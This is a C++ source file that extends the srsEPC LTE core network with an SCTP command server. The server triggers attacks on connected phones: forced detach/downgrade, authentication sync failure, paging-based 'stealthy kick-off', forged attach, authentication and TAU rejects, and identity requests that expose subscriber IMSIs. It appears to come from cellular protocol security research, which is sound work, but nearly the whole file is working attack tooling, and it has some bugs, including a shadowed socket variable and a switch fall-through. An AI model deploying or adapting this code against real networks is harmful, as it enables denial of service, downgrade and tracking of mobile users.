#include <arpa/inet.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <netinet/in.h>
#include <netinet/sctp.h>

#include "srsepc/hdr/mme/nas.h"
#include "srsepc/hdr/mme/s1ap.h"
#include "srsepc/hdr/mme/s1ap_nas_transport.h"
#include "srsran/asn1/liblte_mme.h"
#include "srsran/common/byte_buffer.h"
#include "srsran/common/common.h"
#include "srsran/phy/common/phy_common.h"

#include "srsepc/hdr/tcpserver/tcpserver.h"

#define PORT                  7897
#define LEAP_MSG_TOTAL_LENGTH 500

namespace srsepc {

/****************************** vals ******************************/
// socket
int                socketfd, assocfd;
struct sockaddr_in s_addr, r_addr;
socklen_t          len;
char               sendbuf[8192];
char               recvbuf[8192];

// flags
bool auth_sync_failure_attack_flag = false;
bool stealthy_kick_off_attack_flag = false;

// epc infos
leap_info_t* leap_info = NULL;
/****************************** vals ******************************/

int leap_send_only(int     assocfd, 
                   uint8_t message_id, 
                   uint8_t ue_id, 
                   char*   sendbuf, 
                   int     size)
{
  printf("Leap: send message\n");

  leap_message_t* send_message = (leap_message_t*)malloc(size + 3);
  send_message->message_id     = message_id;
  send_message->ue_id          = ue_id;
  send_message->length         = size;
  memcpy(send_message->message, sendbuf, size);

  sctp_sendmsg(assocfd, send_message, size + 3, 0, 0, 0, 0, 0, 0, 0);

  return 1;
}

int leap_send(int     assocfd, 
              uint8_t message_id, 
              uint8_t ue_id, 
              char*   sendbuf, 
              int     size)
{
  printf("Leap: send message\n");

  leap_message_t* send_message = (leap_message_t*)malloc(size + 3);
  send_message->message_id     = message_id;
  send_message->ue_id          = ue_id;
  send_message->length         = size;
  memcpy(send_message->message, sendbuf, size);

  sctp_sendmsg(assocfd, send_message, size + 3, 0, 0, 0, 0, 0, 0, 0);

  return leap_loop();
}

int leap_recv_only(int   assocfd, 
                   char* recvbuf, 
                   int   size, 
                   int   flag)
{
  printf("Leap: receive command from client\n");
  int recv_size = sctp_recvmsg(assocfd, recvbuf, size, 0, 0, 0, 0);
  return 0;
}

int leap_recv(int   assocfd, 
              char* recvbuf, 
              int   size, 
              int   flag)
{
  printf("Leap: receive command from client\n");
  int recv_size = sctp_recvmsg(assocfd, recvbuf, size, 0, 0, 0, 0);
  if(recv_size == 0)
  {
    printf("Leap: client disconnect with server\n");
    close(socketfd);
    close(assocfd);
    free(leap_info);
    return 0;
  }
  else if(recv_size == -1)
  {
    printf("Leap: failed to receive command from client\n");
    return -1;
  }

  // get command_id
  leap_command_t* msg_proc_t;
  msg_proc_t = (leap_command_t*)recvbuf;
  int8_t command_id = msg_proc_t->command_id;

  switch(command_id) 
  {
    case EXIT_LEAP_LOOP: 
    {
      printf("Leap: EXIT_LEAP_LOOP\n");
      return 0;
    }
    
    /*case HOLD_FALSE: 
    {
      printf("hold false signal detected\n");
      return 0;
      break;
    }*/

    /*case HOLD_TRUE: 
    {
      printf("hold signal detected\n");
      return 1;
      break;
    }*/

    /*case GET_EMM_SECURITY_CONTEXT: 
    {
      printf("Leap: GET_EMM_SECURITY_CONTEXT\n");
      char st[10] = "-1";
      leap_send_only(assocfd, LEAP_EMM_SECURITY_CTX, 1, st, 3);
      break;
    }*/

    /*case GET_EMM_PROC_COMMON_GET_ARGS: 
    {
      ...
    }*/

    case SET_AND_SEND_ATTACH_REJECT: 
    {
      printf("Leap: SET_AND_SEND_ATTACH_REJECT\n");
      leap_info->leap_nas_ctx->leap_send_attach_reject(leap_info->leap_s1ap);
      break;
    }

    /*case NAS_ITTI_DL_DATA: 
    {
      ...
    }*/

    /*case NAS_ITTI_PLAIN_MSG: 
    {
      ...
    }*/

    /*case NAS_PROC_ESTABLISH_IND: 
    {
      ...
    }*/

    /*case NAS_INITIAL_ATTACH_PROC:
    {
      ...
    }*/

    case SET_AND_SEND_AUTHENTICATION_REJECT: 
    {
      printf("Leap: SET_AND_SEND_AUTHENTICATION_REJECT\n");
      leap_info->leap_nas_ctx->leap_send_authentication_reject(leap_info->leap_s1ap);
      break;
    }

    case SEND_NETWORK_INITIATED_DETACH_REQUEST: 
    {
      printf("Leap: DETACH/DOWNGRADE_ATTACK start ...\n");
      leap_info->leap_nas_ctx->leap_send_detach_request(leap_info->leap_s1ap);
      break;
    }

    case AUTH_SYNC_FAILURE_ATTACK:
    {
      printf("Leap: AUTH_SYNC_FAILURE_ATTACK start ...\n");
      auth_sync_failure_attack_flag = true;
      printf("Leap: auth_sync_failure_attack_flag = %d\n", auth_sync_failure_attack_flag);
      // receive attach_request with malice 5 times
      for(int i = 0; i < 5; i++)
      {
        int recv_size = sctp_recvmsg(assocfd, recvbuf, 8192, NULL, NULL, NULL, NULL);
        srsran::byte_buffer_t* modified_nas_msg_p = (srsran::byte_buffer_t*)recvbuf;
        printf("auth_sync_failure_attack %d times\n", i + 1);
        nas::handle_attach_request(leap_info->leap_enb_ue_s1ap_id,
                                   leap_info->leap_enb_sri,
                                   modified_nas_msg_p,
                                   leap_info->leap_m_nas_init,
                                   leap_info->leap_m_nas_if);
      }
      break;
    }

    case PAGING_CHANNEL_HIJACKING:
    {
      // send fake empty paging message
    }

    case STEALTHY_KICKING_OFF_ATTACK:
    {
      printf("Leap: STEALTHY_KICKING_OFF_ATTACK start ...\n");
      stealthy_kick_off_attack_flag = true;
      printf("Leap: stealthy_kick_off_attack_flag = %d\n", stealthy_kick_off_attack_flag);
      s1ap::get_instance()->send_paging(leap_info->leap_imsi, leap_info->leap_eps_bearer_id);
      break;
    }

    case SET_AND_SEND_TAU_REJECT:
    {
      printf("Leap: SET_AND_SEND_TAU_REJECT ...\n");
      leap_info->leap_nas_ctx->leap_send_tau_reject(leap_info->leap_s1ap);
      break;
    }

    case SET_AND_SEND_IDENTITY_REQUEST:
    {
      printf("Leap: SET_AND_SEND_IDENTITY_REQUEST ...\n");
      leap_info->leap_nas_ctx->leap_send_identity_request(leap_info->leap_s1ap);
      break;
    }
  }

  return 1;
}

int leap_loop()
{
  printf("Leap: loop ...\n");
  /*
   * rc ==  1: continue loop
   * rc ==  0: exit loop
   * rc == -1: error
   */
  int rc = 1;
  while(rc == 1)
  {
    rc = leap_recv(assocfd, recvbuf, buf_size, 0);
  }

  return rc;
}

void tcp_init()
{
  printf("Leap: init ...\n");
 
  pthread_t tcp_tid;
  pthread_create(&tcp_tid, NULL, tcpproc, NULL);

  leap_info = (leap_info_t*)malloc(sizeof(leap_info_t));
}

void* tcpproc(void* p)
{
  // 1.create listen fd
  int socketfd = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
  if(socketfd == -1)
  {
    printf("Leap: fail to create SCTP socket!\n");
    return NULL;
  }
  else
  {
    printf("Leap: SCTP socket create success!\n");
  }
  
  // 2.bind ip and port
  memset(&s_addr, 0x00, sizeof(s_addr));
  s_addr.sin_family      = PF_INET;
  s_addr.sin_port        = htons(PORT);
  s_addr.sin_addr.s_addr = inet_addr("192.168.137.99");

  int ret = bind(socketfd, (struct sockaddr*)&s_addr, sizeof(s_addr));
  if(ret == -1)
  {
    printf("Leap: bind failed!\n");
    return NULL;
  }
  else
  {
    printf("Leap: bind success!\n");
  }

  // 3.set socket options
  struct sctp_initmsg initmsg;
  memset(&initmsg, 0, sizeof(initmsg));
  initmsg.sinit_num_ostreams  = 5;
  initmsg.sinit_max_instreams = 5;
  initmsg.sinit_max_attempts  = 4;
  setsockopt(socketfd, IPPROTO_SCTP, SCTP_INITMSG, &initmsg, sizeof(initmsg));

  // 4.listen
  ret = listen(socketfd, 5);
  if(ret == -1)
  {
    printf("Leap: listen failed!\n");
    return NULL;
  }
  else
  {
    printf("Leap: listen success!\n");
  }
  
  // 5.accept client's connection
  len = sizeof(struct sockaddr);
  assocfd = accept(socketfd, (struct sockaddr*)&r_addr, &len);
  if (assocfd == -1)
  {
    printf("Leap: accept failed!\n");
    return NULL;
  }
  else
  {
    printf("Leap: accept success!\n");
    printf("Leap: waiting ...\n");
  }

  // int a;
  // scanf("%d", &a);
  // close(assocfd);
  // close(socketfd);

  return NULL;
}

int leap_wait_command()
{
  pthread_t wait_command_tid;
  int ret = pthread_create(&wait_command_tid, NULL, _leap_wait_command, NULL);
  return ret;
}

void* _leap_wait_command(void* p)
{
  char  c[10] = "";
  char* c_p   = c;
  leap_send(assocfd, LEAP_WAIT_COMMAND, 0, c_p, 0);
  return NULL;
}

void* communicate_with_client(void* arg)
{
  leap_info_t* info = (leap_info_t*)arg;

  leap_send(assocfd, 
            info->leap_message_id, 
            info->leap_enb_ue_s1ap_id,
            info->leap_nas_msg,
            info->leap_nas_msg_size);

  return NULL;
}

} // namespace srsepc